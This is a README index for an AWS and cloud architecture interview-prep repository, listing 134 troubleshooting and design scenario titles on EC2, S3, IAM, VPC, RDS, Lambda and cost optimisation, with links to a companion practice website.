# ☁️ AWS & Cloud Architecture Interview Scenarios & Runbooks

> Real-world AWS architecture scenarios, multi-region failover, IAM governance, VPC networking, RDS HA, and cost optimization interview playbooks.

<!-- Total Scenarios: 214 | Author: Naveed Ahmed -->

[![Live Interactive Simulator](https://img.shields.io/badge/Live_Simulator-interview.naveedkumbhar.com-00d2ff?style=for-the-badge&logo=googlechrome&logoColor=white)](https://interview.naveedkumbhar.com/?cat=aws)
[![Total Scenarios](https://img.shields.io/badge/Scenarios-214_Live-4ade80?style=for-the-badge)](https://interview.naveedkumbhar.com/?cat=aws)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](LICENSE)
[![Author](https://img.shields.io/badge/Author-Naveed_Ahmed-purple?style=for-the-badge&logo=github)](https://github.com/naveedkumbhar)

---

### 🚀 Interactive Practice Mode Available

All **214 scenarios** in this repository are interactive on the live practice engine with search, category filtering, bookmarking, and timer modes:
👉 **[Launch Interactive Simulator on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)**

---

## 📑 Scenarios Directory

1. [Zero-Downtime Amazon EKS Minor & Multi-Version Upgrade (v1.34 → v1.36+)](#scenario-1-zero-downtime-amazon-eks-minor-multi-version-upgrade-v1-34-v1-36)
2. [EC2 CPU Suddenly Reaches 100% — Troubleshooting Runbook](#scenario-2-ec2-cpu-suddenly-reaches-100-troubleshooting-runbook)
3. [EC2 Running but SSH Isn't Working — Layer-by-Layer Diagnostics](#scenario-3-ec2-running-but-ssh-isn-t-working-layer-by-layer-diagnostics)
4. [ALB Starts Returning 5xx Errors — Identifying Root Cause](#scenario-4-alb-starts-returning-5xx-errors-identifying-root-cause)
5. [App Works Internally but Not from Internet — Network Tracing](#scenario-5-app-works-internally-but-not-from-internet-network-tracing)
6. [Secure Secrets Management in CI/CD & Production](#scenario-6-secure-secrets-management-in-ci-cd-production)
7. [Implementing Blue-Green vs Canary Deployments in Production](#scenario-7-implementing-blue-green-vs-canary-deployments-in-production)
8. [terraform plan Shows Unexpected Changes — Investigation Steps](#scenario-8-terraform-plan-shows-unexpected-changes-investigation-steps)
9. [Someone Manually Changes Terraform Infrastructure — What Happens?](#scenario-9-someone-manually-changes-terraform-infrastructure-what-happens)
10. [Managing Terraform State for Multiple Engineers — Enterprise Architecture](#scenario-10-managing-terraform-state-for-multiple-engineers-enterprise-architecture)
11. [Design a High-Availability Cloud Infrastructure for Millions of Requests/Day](#scenario-11-design-a-high-availability-cloud-infrastructure-for-millions-of-requests-day)
12. [Migrating a Large Production Workload from On-Premises to AWS with Minimal Downtime](#scenario-12-migrating-a-large-production-workload-from-on-premises-to-aws-with-minimal-downtime)
13. [Ingress Controller — End-to-End OSI Layer 7 Traffic Flow](#scenario-13-ingress-controller-end-to-end-osi-layer-7-traffic-flow)
14. [Cloud Cost Optimization Across Dev, QA, UAT, and Production](#scenario-14-cloud-cost-optimization-across-dev-qa-uat-and-production)
15. [Detecting & Eliminating Unused / Orphaned Cloud Resources](#scenario-15-detecting-eliminating-unused-orphaned-cloud-resources)
16. [Managing Secrets Securely in Kubernetes — External Secrets Operator (ESO)](#scenario-16-managing-secrets-securely-in-kubernetes-external-secrets-operator-eso)
17. [AWS Q1: You launched an EC2 instance but cant SSH into it What do you check [L1]](#scenario-17-aws-q1-you-launched-an-ec2-instance-but-cant-ssh-into-it-what-do-you-check-l1)
18. [AWS Q2: Your EC2 instance is showing high CPU and your application is slow What steps do you take [L2]](#scenario-18-aws-q2-your-ec2-instance-is-showing-high-cpu-and-your-application-is-slow-what-steps-do-you-take-l2)
19. [AWS Q3: You have a fleet of EC2 instances behind an ALB One instance keeps getting traffic even though its unhealthy Whats wrong [L2]](#scenario-19-aws-q3-you-have-a-fleet-of-ec2-instances-behind-an-alb-one-instance-keeps-getting-traffic-even-though-its-unhealthy-whats-wrong-l2)
20. [AWS Q4: An EC2 instance in an Auto Scaling Group keeps being terminated and replaced The new instance starts becomes healthy then gets terminated again in a cycle Whats happening [L3]](#scenario-20-aws-q4-an-ec2-instance-in-an-auto-scaling-group-keeps-being-terminated-and-replaced-the-new-instance-starts-becomes-healthy-then-gets-terminated-again-in-a-cycle-whats-happening-l3)
21. [AWS Q5: You want EC2 instances in private subnets to download packages from the internet (like yum install) How do you enable this [L2]](#scenario-21-aws-q5-you-want-ec2-instances-in-private-subnets-to-download-packages-from-the-internet-like-yum-install-how-do-you-enable-this-l2)
22. [AWS Q6: Your On-Demand EC2 costs are very high How would you optimize [L3]](#scenario-22-aws-q6-your-on-demand-ec2-costs-are-very-high-how-would-you-optimize-l3)
23. [AWS Q7: You accidentally deleted an important file from S3 How do you recover it [L1]](#scenario-23-aws-q7-you-accidentally-deleted-an-important-file-from-s3-how-do-you-recover-it-l1)
24. [AWS Q8: Your S3 bucket is publicly accessible and AWS sent you a security alert How do you fix it [L2]](#scenario-24-aws-q8-your-s3-bucket-is-publicly-accessible-and-aws-sent-you-a-security-alert-how-do-you-fix-it-l2)
25. [AWS Q9: S3 uploads from your app are failing with 403 Forbidden What are the possible causes [L2]](#scenario-25-aws-q9-s3-uploads-from-your-app-are-failing-with-403-forbidden-what-are-the-possible-causes-l2)
26. [AWS Q10: You have 100TB of data in S3 that is accessed very infrequently (once a year for audit) How do you minimize storage costs [L3]](#scenario-26-aws-q10-you-have-100tb-of-data-in-s3-that-is-accessed-very-infrequently-once-a-year-for-audit-how-do-you-minimize-storage-costs-l3)
27. [AWS Q11: How do you securely share an S3 object with an external partner who doesnt have an AWS account [L2]](#scenario-27-aws-q11-how-do-you-securely-share-an-s3-object-with-an-external-partner-who-doesnt-have-an-aws-account-l2)
28. [AWS Q12: Your application writes millions of small files to S3 Performance is slow on listing and retrieval How do you optimize [L3]](#scenario-28-aws-q12-your-application-writes-millions-of-small-files-to-s3-performance-is-slow-on-listing-and-retrieval-how-do-you-optimize-l3)
29. [AWS Q13: What is the difference between a Security Group and a Network ACL (NACL) [L1]](#scenario-29-aws-q13-what-is-the-difference-between-a-security-group-and-a-network-acl-nacl-l1)
30. [AWS Q14: Two EC2 instances in the same VPC cant communicate What do you check [L2]](#scenario-30-aws-q14-two-ec2-instances-in-the-same-vpc-cant-communicate-what-do-you-check-l2)
31. [AWS Q15: You need two VPCs in different AWS accounts to communicate privately How do you set this up [L2]](#scenario-31-aws-q15-you-need-two-vpcs-in-different-aws-accounts-to-communicate-privately-how-do-you-set-this-up-l2)
32. [AWS Q16: Your VPC has overlapping CIDR blocks with an on-premises network and you need to connect them via VPN What do you do [L3]](#scenario-32-aws-q16-your-vpc-has-overlapping-cidr-blocks-with-an-on-premises-network-and-you-need-to-connect-them-via-vpn-what-do-you-do-l3)
33. [AWS Q17: What is VPC Flow Logs and how do you use it for security investigations [L2]](#scenario-33-aws-q17-what-is-vpc-flow-logs-and-how-do-you-use-it-for-security-investigations-l2)
34. [AWS Q18: You need to connect your AWS VPC to an on-premises data center What are the options and tradeoffs [L3]](#scenario-34-aws-q18-you-need-to-connect-your-aws-vpc-to-an-on-premises-data-center-what-are-the-options-and-tradeoffs-l3)
35. [AWS Q19: What is an Elastic Load Balancer and what are the differences between ALB NLB and CLB [L2]](#scenario-35-aws-q19-what-is-an-elastic-load-balancer-and-what-are-the-differences-between-alb-nlb-and-clb-l2)
36. [AWS Q20: Your ALB target group is showing all instances as unhealthy What do you check [L2]](#scenario-36-aws-q20-your-alb-target-group-is-showing-all-instances-as-unhealthy-what-do-you-check-l2)
37. [AWS Q21: A Lambda function is failing with Access Denied when trying to write to DynamoDB How do you fix it [L2]](#scenario-37-aws-q21-a-lambda-function-is-failing-with-access-denied-when-trying-to-write-to-dynamodb-how-do-you-fix-it-l2)
38. [AWS Q22: You need to give a third-party vendor access to a specific S3 bucket without giving them AWS credentials How [L2]](#scenario-38-aws-q22-you-need-to-give-a-third-party-vendor-access-to-a-specific-s3-bucket-without-giving-them-aws-credentials-how-l2)
39. [AWS Q23: You discover that an IAM access key was accidentally committed to a public GitHub repository What do you do immediately [L3]](#scenario-39-aws-q23-you-discover-that-an-iam-access-key-was-accidentally-committed-to-a-public-github-repository-what-do-you-do-immediately-l3)
40. [AWS Q24: What is the difference between an IAM policy attached to a user vs a resource policy attached to an S3 bucket [L2]](#scenario-40-aws-q24-what-is-the-difference-between-an-iam-policy-attached-to-a-user-vs-a-resource-policy-attached-to-an-s3-bucket-l2)
41. [AWS Q25: Explain how IAM permission boundaries work and give a use case [L3]](#scenario-41-aws-q25-explain-how-iam-permission-boundaries-work-and-give-a-use-case-l3)
42. [AWS Q26: What is the difference between ECS with EC2 launch type and ECS with Fargate [L2]](#scenario-42-aws-q26-what-is-the-difference-between-ecs-with-ec2-launch-type-and-ecs-with-fargate-l2)
43. [AWS Q27: Your ECS task keeps stopping with exit code 137 Whats happening [L2]](#scenario-43-aws-q27-your-ecs-task-keeps-stopping-with-exit-code-137-whats-happening-l2)
44. [AWS Q28: A Lambda function times out on every invocation What could be the cause [L2]](#scenario-44-aws-q28-a-lambda-function-times-out-on-every-invocation-what-could-be-the-cause-l2)
45. [AWS Q29: You have a Lambda function thats running fine at 10 invocations/second but fails at 1000/second with throttling errors How do you handle this [L3]](#scenario-45-aws-q29-you-have-a-lambda-function-thats-running-fine-at-10-invocations-second-but-fails-at-1000-second-with-throttling-errors-how-do-you-handle-this-l3)
46. [AWS Q30: Explain the difference between EKS and ECS When would you recommend each [L3]](#scenario-46-aws-q30-explain-the-difference-between-eks-and-ecs-when-would-you-recommend-each-l3)
47. [AWS Q31: Your RDS instance is using 100% CPU What do you do [L2]](#scenario-47-aws-q31-your-rds-instance-is-using-100-cpu-what-do-you-do-l2)
48. [AWS Q32: You need to migrate a 500GB production RDS database to a new region with minimal downtime How [L2]](#scenario-48-aws-q32-you-need-to-migrate-a-500gb-production-rds-database-to-a-new-region-with-minimal-downtime-how-l2)
49. [AWS Q33: An RDS instance went down and the automated failover to the standby didnt happen as expected in a Multi-AZ setup What could have gone wrong [L3]](#scenario-49-aws-q33-an-rds-instance-went-down-and-the-automated-failover-to-the-standby-didnt-happen-as-expected-in-a-multi-az-setup-what-could-have-gone-wrong-l3)
50. [AWS Q34: Your application connects directly to RDS and at peak load you see Too many connections errors How do you fix this [L2]](#scenario-50-aws-q34-your-application-connects-directly-to-rds-and-at-peak-load-you-see-too-many-connections-errors-how-do-you-fix-this-l2)
51. [AWS Q35: You want to implement a database backup strategy for RDS that allows you to restore to any point in the last 7 days How [L3]](#scenario-51-aws-q35-you-want-to-implement-a-database-backup-strategy-for-rds-that-allows-you-to-restore-to-any-point-in-the-last-7-days-how-l3)
52. [AWS Q36: You want to get an alert when your EC2 instance CPU exceeds 80% for more than 5 minutes How do you set this up [L2]](#scenario-52-aws-q36-you-want-to-get-an-alert-when-your-ec2-instance-cpu-exceeds-80-for-more-than-5-minutes-how-do-you-set-this-up-l2)
53. [AWS Q37: What is the difference between CloudWatch Logs CloudWatch Metrics and CloudWatch Alarms [L2]](#scenario-53-aws-q37-what-is-the-difference-between-cloudwatch-logs-cloudwatch-metrics-and-cloudwatch-alarms-l2)
54. [AWS Q38: Your application has no observability and you need to build a monitoring stack from scratch on AWS What would you set up [L3]](#scenario-54-aws-q38-your-application-has-no-observability-and-you-need-to-build-a-monitoring-stack-from-scratch-on-aws-what-would-you-set-up-l3)
55. [AWS Q39: Youre being charged for more CloudWatch API calls than expected How do you investigate and reduce costs [L3]](#scenario-55-aws-q39-youre-being-charged-for-more-cloudwatch-api-calls-than-expected-how-do-you-investigate-and-reduce-costs-l3)
56. [AWS Q40: What is AWS CloudTrail and how is it different from CloudWatch [L2]](#scenario-56-aws-q40-what-is-aws-cloudtrail-and-how-is-it-different-from-cloudwatch-l2)
57. [AWS Q41: Walk me through building a CI/CD pipeline for a containerized app using AWS-native services [L2]](#scenario-57-aws-q41-walk-me-through-building-a-ci-cd-pipeline-for-a-containerized-app-using-aws-native-services-l2)
58. [AWS Q42: Your CodeBuild job is failing with a permissions error when trying to push to ECR What do you check [L2]](#scenario-58-aws-q42-your-codebuild-job-is-failing-with-a-permissions-error-when-trying-to-push-to-ecr-what-do-you-check-l2)
59. [AWS Q43: Design a highly available scalable web application architecture on AWS for a startup that expects unpredictable traffic [L3]](#scenario-59-aws-q43-design-a-highly-available-scalable-web-application-architecture-on-aws-for-a-startup-that-expects-unpredictable-traffic-l3)
60. [AWS Q44: What is the shared responsibility model in AWS [L2]](#scenario-60-aws-q44-what-is-the-shared-responsibility-model-in-aws-l2)
61. [AWS Q45: Your AWS bill doubled this month unexpectedly How do you investigate [L3]](#scenario-61-aws-q45-your-aws-bill-doubled-this-month-unexpectedly-how-do-you-investigate-l3)
62. [AWS Q46: What is AWS Config and how does it differ from CloudTrail [L2]](#scenario-62-aws-q46-what-is-aws-config-and-how-does-it-differ-from-cloudtrail-l2)
63. [AWS Q47: Your S3 bucket website shows 403 Forbidden [L1]](#scenario-63-aws-q47-your-s3-bucket-website-shows-403-forbidden-l1)
64. [AWS Q48: Lambda function needs to access RDS in a private subnet [L2]](#scenario-64-aws-q48-lambda-function-needs-to-access-rds-in-a-private-subnet-l2)
65. [AWS Q49: EC2 instance in private subnet needs to call AWS APIs (eg S3 SSM) How without NAT Gateway [L2]](#scenario-65-aws-q49-ec2-instance-in-private-subnet-needs-to-call-aws-apis-eg-s3-ssm-how-without-nat-gateway-l2)
66. [AWS Q50: Design a multi-region active-active architecture [L3]](#scenario-66-aws-q50-design-a-multi-region-active-active-architecture-l3)
67. [AWS Q51: An S3 lifecycle rule is not transitioning objects as expected [L2]](#scenario-67-aws-q51-an-s3-lifecycle-rule-is-not-transitioning-objects-as-expected-l2)
68. [AWS Q52: CloudFormation stack update is failing and rolling back [L2]](#scenario-68-aws-q52-cloudformation-stack-update-is-failing-and-rolling-back-l2)
69. [AWS Q53: How do you implement blue-green deployments on ECS [L3]](#scenario-69-aws-q53-how-do-you-implement-blue-green-deployments-on-ecs-l3)
70. [AWS Q54: SQS queue is growing (consumer cant keep up) [L2]](#scenario-70-aws-q54-sqs-queue-is-growing-consumer-cant-keep-up-l2)
71. [AWS Q55: SNS topic notification not being received [L2]](#scenario-71-aws-q55-sns-topic-notification-not-being-received-l2)
72. [AWS Q56: What is the difference between SQS and SNS [L1]](#scenario-72-aws-q56-what-is-the-difference-between-sqs-and-sns-l1)
73. [AWS Q57: DynamoDB read latency suddenly increased [L2]](#scenario-73-aws-q57-dynamodb-read-latency-suddenly-increased-l2)
74. [AWS Q58: How do you implement least-privilege access for a microservices application where each service has a different IAM role [L3]](#scenario-74-aws-q58-how-do-you-implement-least-privilege-access-for-a-microservices-application-where-each-service-has-a-different-iam-role-l3)
75. [AWS Q59: CloudFront is serving stale content after you updated S3 [L2]](#scenario-75-aws-q59-cloudfront-is-serving-stale-content-after-you-updated-s3-l2)
76. [AWS Q60: Design an event-driven architecture for image processing (upload → resize → store) [L3]](#scenario-76-aws-q60-design-an-event-driven-architecture-for-image-processing-upload-resize-store-l3)
77. [AWS Q61: Route 53 health check is failing for your endpoint but the endpoint seems fine [L2]](#scenario-77-aws-q61-route-53-health-check-is-failing-for-your-endpoint-but-the-endpoint-seems-fine-l2)
78. [AWS Q62: You need to run a containerized batch job once per day on AWS Whats the simplest approach [L2]](#scenario-78-aws-q62-you-need-to-run-a-containerized-batch-job-once-per-day-on-aws-whats-the-simplest-approach-l2)
79. [AWS Q63: How does AWS WAF protect your ALB and what rules would you set up for a web app [L3]](#scenario-79-aws-q63-how-does-aws-waf-protect-your-alb-and-what-rules-would-you-set-up-for-a-web-app-l3)
80. [AWS Q64: Your Lambda function is doing the same cold start every invocation because it initializes a big ML model How do you fix it [L2]](#scenario-80-aws-q64-your-lambda-function-is-doing-the-same-cold-start-every-invocation-because-it-initializes-a-big-ml-model-how-do-you-fix-it-l2)
81. [AWS Q65: You need to store application state for a session-based web app deployed across multiple EC2 instances Where do you store sessions [L2]](#scenario-81-aws-q65-you-need-to-store-application-state-for-a-session-based-web-app-deployed-across-multiple-ec2-instances-where-do-you-store-sessions-l2)
82. [AWS Q66: What is AWS Systems Manager Parameter Store vs Secrets Manager [L2]](#scenario-82-aws-q66-what-is-aws-systems-manager-parameter-store-vs-secrets-manager-l2)
83. [AWS Q67: Your production DB needs a schema migration that could lock tables for minutes How do you do this with zero downtime [L3]](#scenario-83-aws-q67-your-production-db-needs-a-schema-migration-that-could-lock-tables-for-minutes-how-do-you-do-this-with-zero-downtime-l3)
84. [AWS Q68: EC2 instances in an ASG arent launching due to InsufficientInstanceCapacity [L2]](#scenario-84-aws-q68-ec2-instances-in-an-asg-arent-launching-due-to-insufficientinstancecapacity-l2)
85. [AWS Q69: How do you enable encryption for an existing unencrypted RDS instance [L2]](#scenario-85-aws-q69-how-do-you-enable-encryption-for-an-existing-unencrypted-rds-instance-l2)
86. [AWS Q70: An application deployed via Elastic Beanstalk needs environment variables How do you set them [L2]](#scenario-86-aws-q70-an-application-deployed-via-elastic-beanstalk-needs-environment-variables-how-do-you-set-them-l2)
87. [AWS Q71: What is AWS Nitro Enclaves and what problem does it solve [L3]](#scenario-87-aws-q71-what-is-aws-nitro-enclaves-and-what-problem-does-it-solve-l3)
88. [AWS Q72: Youre exceeding the 5 VPC limit per region What do you do [L2]](#scenario-88-aws-q72-youre-exceeding-the-5-vpc-limit-per-region-what-do-you-do-l2)
89. [AWS Q73: How does Auto Scaling determine when to scale in vs scale out [L2]](#scenario-89-aws-q73-how-does-auto-scaling-determine-when-to-scale-in-vs-scale-out-l2)
90. [AWS Q74: You need to query data across multiple AWS accounts using SQL What service do you use [L3]](#scenario-90-aws-q74-you-need-to-query-data-across-multiple-aws-accounts-using-sql-what-service-do-you-use-l3)
91. [AWS Q75: Your SQS consumer occasionally processes the same message twice How do you handle this [L2]](#scenario-91-aws-q75-your-sqs-consumer-occasionally-processes-the-same-message-twice-how-do-you-handle-this-l2)
92. [AWS Q76: What is the difference between vertical and horizontal scaling and which does AWS encourage [L2]](#scenario-92-aws-q76-what-is-the-difference-between-vertical-and-horizontal-scaling-and-which-does-aws-encourage-l2)
93. [AWS Q77: How would you implement a zero-trust network architecture in AWS [L3]](#scenario-93-aws-q77-how-would-you-implement-a-zero-trust-network-architecture-in-aws-l3)
94. [AWS Q78: A CloudFormation stack is in UPDATE_ROLLBACK_FAILED state How do you recover [L2]](#scenario-94-aws-q78-a-cloudformation-stack-is-in-update-rollback-failed-state-how-do-you-recover-l2)
95. [AWS Q79: How do you prevent accidental deletion of an S3 bucket with important data [L2]](#scenario-95-aws-q79-how-do-you-prevent-accidental-deletion-of-an-s3-bucket-with-important-data-l2)
96. [AWS Q80: You need to implement a DR (Disaster Recovery) strategy for a business-critical app on AWS Walk me through options [L3]](#scenario-96-aws-q80-you-need-to-implement-a-dr-disaster-recovery-strategy-for-a-business-critical-app-on-aws-walk-me-through-options-l3)
97. [AWS Q81: What is AWS GuardDuty [L2]](#scenario-97-aws-q81-what-is-aws-guardduty-l2)
98. [AWS Q82: An EC2 instance is making unexpected outbound connections to unknown IPs What do you do [L2]](#scenario-98-aws-q82-an-ec2-instance-is-making-unexpected-outbound-connections-to-unknown-ips-what-do-you-do-l2)
99. [AWS Q83: How does AWS KMS work and when would you use customer-managed keys vs AWS-managed keys [L3]](#scenario-99-aws-q83-how-does-aws-kms-work-and-when-would-you-use-customer-managed-keys-vs-aws-managed-keys-l3)
100. [AWS Q84: What is Amazon EventBridge and how does it differ from SNS [L2]](#scenario-100-aws-q84-what-is-amazon-eventbridge-and-how-does-it-differ-from-sns-l2)
101. [AWS Q85: You want to run your application in multiple AWS regions What data challenges do you face [L2]](#scenario-101-aws-q85-you-want-to-run-your-application-in-multiple-aws-regions-what-data-challenges-do-you-face-l2)
102. [AWS Q86: Design a serverless data pipeline for ingesting 1M events per day [L3]](#scenario-102-aws-q86-design-a-serverless-data-pipeline-for-ingesting-1m-events-per-day-l3)
103. [AWS Q87: What is the difference between Kinesis Data Streams and SQS [L2]](#scenario-103-aws-q87-what-is-the-difference-between-kinesis-data-streams-and-sqs-l2)
104. [AWS Q88: An ECS service task is running but the ALB shows it as unhealthy [L2]](#scenario-104-aws-q88-an-ecs-service-task-is-running-but-the-alb-shows-it-as-unhealthy-l2)
105. [AWS Q89: How do you implement infrastructure drift detection [L3]](#scenario-105-aws-q89-how-do-you-implement-infrastructure-drift-detection-l3)
106. [AWS Q90: Youre getting throttled on AWS API calls How do you fix it [L2]](#scenario-106-aws-q90-youre-getting-throttled-on-aws-api-calls-how-do-you-fix-it-l2)
107. [AWS Q91: What is Amazon Inspector and when would you use it [L2]](#scenario-107-aws-q91-what-is-amazon-inspector-and-when-would-you-use-it-l2)
108. [AWS Q92: How does AWS handle availability zones and how should you design for AZ failure [L3]](#scenario-108-aws-q92-how-does-aws-handle-availability-zones-and-how-should-you-design-for-az-failure-l3)
109. [AWS Q93: What is AWS Trusted Advisor and what does it check [L2]](#scenario-109-aws-q93-what-is-aws-trusted-advisor-and-what-does-it-check-l2)
110. [AWS Q94: How do you rotate an RDS database password without downtime [L2]](#scenario-110-aws-q94-how-do-you-rotate-an-rds-database-password-without-downtime-l2)
111. [AWS Q95: What is Service Control Policy (SCP) in AWS Organizations and how is it different from an IAM policy [L3]](#scenario-111-aws-q95-what-is-service-control-policy-scp-in-aws-organizations-and-how-is-it-different-from-an-iam-policy-l3)
112. [AWS Q96: How do you set up cross-account logging where all AWS accounts in your org send logs to a central security account [L2]](#scenario-112-aws-q96-how-do-you-set-up-cross-account-logging-where-all-aws-accounts-in-your-org-send-logs-to-a-central-security-account-l2)
113. [AWS Q97: Your application is making too many calls to AWS Secrets Manager and youre being charged heavily How do you reduce this [L2]](#scenario-113-aws-q97-your-application-is-making-too-many-calls-to-aws-secrets-manager-and-youre-being-charged-heavily-how-do-you-reduce-this-l2)
114. [AWS Q98: What is AWS PrivateLink and how does it differ from VPC Peering [L3]](#scenario-114-aws-q98-what-is-aws-privatelink-and-how-does-it-differ-from-vpc-peering-l3)
115. [AWS Q99: Your CloudFormation deployment is taking too long How do you speed it up [L2]](#scenario-115-aws-q99-your-cloudformation-deployment-is-taking-too-long-how-do-you-speed-it-up-l2)
116. [AWS Q100: How would you design a system to handle 100000 concurrent WebSocket connections on AWS [L3]](#scenario-116-aws-q100-how-would-you-design-a-system-to-handle-100000-concurrent-websocket-connections-on-aws-l3)
117. [AWS Q101: A developer needs to temporarily get a shell inside a running Fargate container in a private subnet with absolutely no inbound SSH access How do you facilitate this securely [L2]](#scenario-117-aws-q101-a-developer-needs-to-temporarily-get-a-shell-inside-a-running-fargate-container-in-a-private-subnet-with-absolutely-no-inbound-ssh-access-how-do-you-facilitate-this-securely-l2)
118. [AWS Q102: A team in AWS Account A is writing data to an S3 bucket in Account B Account B explicitly grants them s3PutObject in the bucket policy However when Account B administrators try to read the files they get Access Denied Why and how is it fixed [L3]](#scenario-118-aws-q102-a-team-in-aws-account-a-is-writing-data-to-an-s3-bucket-in-account-b-account-b-explicitly-grants-them-s3putobject-in-the-bucket-policy-however-when-account-b-administrators-try-to-read-the-files-they-get-access-denied-why-and-how-is-it-fixed-l3)
119. [AWS Q103: You are deploying an API Gateway mapped to a custom domain name natively in the eu-west-1 (Ireland) region You request a free ACM (AWS Certificate Manager) SSL certificate in eu-west-1 but API Gateway absolutely refuses to let you select it from the dropdown Why [L2]](#scenario-119-aws-q103-you-are-deploying-an-api-gateway-mapped-to-a-custom-domain-name-natively-in-the-eu-west-1-ireland-region-you-request-a-free-acm-aws-certificate-manager-ssl-certificate-in-eu-west-1-but-api-gateway-absolutely-refuses-to-let-you-select-it-from-the-dropdown-why-l2)
120. [AWS Q104: In Amazon Route 53 what is the critical architectural difference between a standard DNS CNAME record and an AWS Alias record [L1]](#scenario-120-aws-q104-in-amazon-route-53-what-is-the-critical-architectural-difference-between-a-standard-dns-cname-record-and-an-aws-alias-record-l1)
121. [AWS Q105: You migrate an application from a traditional RDS instance to Aurora Serverless v2 During a sudden 10x traffic spike the database scales up successfully but the application crashes heavily citing Too many connections Why didnt Aurora solve the connection limits [L2]](#scenario-121-aws-q105-you-migrate-an-application-from-a-traditional-rds-instance-to-aurora-serverless-v2-during-a-sudden-10x-traffic-spike-the-database-scales-up-successfully-but-the-application-crashes-heavily-citing-too-many-connections-why-didnt-aurora-solve-the-connection-limits-l2)
122. [AWS Q106: To secure an S3 bucket powering a static website you put CloudFront in front of it How do you strictly guarantee that users can never bypass CloudFront and access the S3 bucket directly via its public URL [L2]](#scenario-122-aws-q106-to-secure-an-s3-bucket-powering-a-static-website-you-put-cloudfront-in-front-of-it-how-do-you-strictly-guarantee-that-users-can-never-bypass-cloudfront-and-access-the-s3-bucket-directly-via-its-public-url-l2)
123. [AWS Q107: An engineer argues that if they upload a file to S3 and immediately trigger a Lambda function to read that file the Lambda might violently crash with a 404 Not Found due to S3s Eventual Consistency Are they correct [L1]](#scenario-123-aws-q107-an-engineer-argues-that-if-they-upload-a-file-to-s3-and-immediately-trigger-a-lambda-function-to-read-that-file-the-lambda-might-violently-crash-with-a-404-not-found-due-to-s3s-eventual-consistency-are-they-correct-l1)
124. [AWS Q108: Your EC2 Auto Scaling Group (ASG) dynamically scales down during the night However when it terminates an instance active users downloading large files are abruptly violently disconnected How do you gracefully drain those connections [L3]](#scenario-124-aws-q108-your-ec2-auto-scaling-group-asg-dynamically-scales-down-during-the-night-however-when-it-terminates-an-instance-active-users-downloading-large-files-are-abruptly-violently-disconnected-how-do-you-gracefully-drain-those-connections-l3)
125. [AWS Q109: You have an SQS queue triggering a Lambda function to encode massive video files Sometimes a video takes 8 minutes to encode You randomly notice the exact same video being encoded simultaneously by two different Lambda functions Why [L2]](#scenario-125-aws-q109-you-have-an-sqs-queue-triggering-a-lambda-function-to-encode-massive-video-files-sometimes-a-video-takes-8-minutes-to-encode-you-randomly-notice-the-exact-same-video-being-encoded-simultaneously-by-two-different-lambda-functions-why-l2)
126. [AWS Q110: To save 70% on compute costs you heavily adopt EC2 Spot Instances for your stateless batch processing data pipeline However AWS can arbitrarily terminate Spot instances when they need capacity back How can you ensure your batch jobs dont leave databases in a corrupted state when killed [L2]](#scenario-126-aws-q110-to-save-70-on-compute-costs-you-heavily-adopt-ec2-spot-instances-for-your-stateless-batch-processing-data-pipeline-however-aws-can-arbitrarily-terminate-spot-instances-when-they-need-capacity-back-how-can-you-ensure-your-batch-jobs-dont-leave-databases-in-a-corrupted-state-when-killed-l2)
127. [AWS Q111: An auditor requires that no EC2 instance in a private VPC subnet can exfiltrate data to an unauthorized S3 bucket You map a VPC Gateway Endpoint to S3 How do you actually enforce the restriction to your specific bucket [L3]](#scenario-127-aws-q111-an-auditor-requires-that-no-ec2-instance-in-a-private-vpc-subnet-can-exfiltrate-data-to-an-unauthorized-s3-bucket-you-map-a-vpc-gateway-endpoint-to-s3-how-do-you-actually-enforce-the-restriction-to-your-specific-bucket-l3)
128. [AWS Q112: You create a DynamoDB table heavily queried by UserID Months later the business wants to query by EmailAddress You go to add a Local Secondary Index (LSI) but the AWS console firmly prevents you Why [L2]](#scenario-128-aws-q112-you-create-a-dynamodb-table-heavily-queried-by-userid-months-later-the-business-wants-to-query-by-emailaddress-you-go-to-add-a-local-secondary-index-lsi-but-the-aws-console-firmly-prevents-you-why-l2)
129. [AWS Q113: Your company uses AWS Organizations You log in as the absolute overarching Root User of a member account and try to delete a CloudTrail log but you violently receive an Access Denied error How is the Root User denied permission [L2]](#scenario-129-aws-q113-your-company-uses-aws-organizations-you-log-in-as-the-absolute-overarching-root-user-of-a-member-account-and-try-to-delete-a-cloudtrail-log-but-you-violently-receive-an-access-denied-error-how-is-the-root-user-denied-permission-l2)
130. [AWS Q114: An application successfully utilizes AWS EFS (Elastic File System) for shared WordPress storage It performs beautifully for 3 months then suddenly grinds to a catastrophic halt dropping to 1 MB/s throughput daily Why [L3]](#scenario-130-aws-q114-an-application-successfully-utilizes-aws-efs-elastic-file-system-for-shared-wordpress-storage-it-performs-beautifully-for-3-months-then-suddenly-grinds-to-a-catastrophic-halt-dropping-to-1-mb-s-throughput-daily-why-l3)
131. [AWS Q115: A serverless payment gateway workflow occasionally takes up to 3 days to resolve because it waits heavily for manual human approval Should you use AWS Step Functions Standard or Express Workflows [L2]](#scenario-131-aws-q115-a-serverless-payment-gateway-workflow-occasionally-takes-up-to-3-days-to-resolve-because-it-waits-heavily-for-manual-human-approval-should-you-use-aws-step-functions-standard-or-express-workflows-l2)
132. [AWS Q116: You enabled AWS CloudTrail across your organization However when you search the logs to find out who uploaded a specific image logopng into an S3 bucket nothing appears You only see bucket creation events Where is the log [L2]](#scenario-132-aws-q116-you-enabled-aws-cloudtrail-across-your-organization-however-when-you-search-the-logs-to-find-out-who-uploaded-a-specific-image-logopng-into-an-s3-bucket-nothing-appears-you-only-see-bucket-creation-events-where-is-the-log-l2)
133. [AWS Q117: In Amazon ECS what is the exact difference between the Task Role and the Task Execution Role [L1]](#scenario-133-aws-q117-in-amazon-ecs-what-is-the-exact-difference-between-the-task-role-and-the-task-execution-role-l1)
134. [AWS Q118: A fleet of 5000 Lambda functions in a private VPC aggressively scrape data from the public internet Randomly hundreds of them begin crashing with bizarre Connection Timed Out networking errors despite the internet destination being perfectly healthy What AWS bottleneck is occurring [L3]](#scenario-134-aws-q118-a-fleet-of-5000-lambda-functions-in-a-private-vpc-aggressively-scrape-data-from-the-public-internet-randomly-hundreds-of-them-begin-crashing-with-bizarre-connection-timed-out-networking-errors-despite-the-internet-destination-being-perfectly-healthy-what-aws-bottleneck-is-occurring-l3)
